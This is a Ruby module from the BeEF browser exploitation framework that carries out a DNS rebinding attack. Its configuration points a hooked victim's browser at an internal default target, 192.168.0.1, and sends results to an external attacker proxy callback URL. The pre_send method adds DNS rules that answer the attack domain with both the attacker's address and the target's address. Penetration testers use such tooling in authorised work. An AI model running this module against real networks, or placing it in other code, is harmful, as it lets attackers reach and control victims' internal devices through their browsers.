class Dns_rebinding < BeEF::Core::Command
    def self.options
        domain = BeEF::Core::Configuration.instance.get('beef.module.dns_rebinding.domain')
        dr_config = BeEF::Core::Configuration.instance.get('beef.extension.dns_rebinding')
        url_callback = 'http://'+dr_config['address_proxy_external']+':'+dr_config['port_proxy'].to_s
        return [{
            'name'=>'target',
            'value'=>'192.168.0.1'
        },
        {
            'name'=>'domain',
            'value'=>domain
        },
        {
            'name'=>'url_callback',
            'value'=>url_callback
        }]
    end

    def pre_send
        dns = BeEF::Extension::Dns::Server.instance
        dr_config = BeEF::Core::Configuration.instance.get('beef.extension.dns_rebinding')

        addr = dr_config['address_http_external']
        domain = BeEF::Core::Configuration.instance.get('beef.module.dns_rebinding.domain')
        target_addr = "192.168.0.1"

        if @datastore[0]
            target_addr = @datastore[0]['value']
        end
        if @datastore[1]
            domain = @datastore[1]['value']
        end
           
        id = dns.add_rule(
            :pattern  => domain,
            :resource => Resolv::DNS::Resource::IN::A,
            :response => [addr, target_addr]
        )

        dns.remove_rule!(id)
            
        id = dns.add_rule(
                :pattern  => domain,
                :resource => Resolv::DNS::Resource::IN::A,
                :response => [addr, target_addr]
        )

    end
end
